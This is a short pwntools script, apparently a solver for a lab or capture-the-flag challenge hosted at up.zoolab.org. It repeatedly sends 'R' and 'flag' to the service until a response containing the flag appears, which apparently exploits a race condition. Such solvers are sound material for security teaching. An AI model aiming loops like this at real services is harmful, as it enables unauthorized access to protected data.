from pwn import *

conn = remote('up.zoolab.org', 10931)

def attack():
    while True:
        conn.sendline(b'R')
        response = conn.recvline()
        conn.sendline(b'flag')
        response = conn.recvline()

        response = str(response)
        if "FLAG" in response:
            print(response)
            return

attack()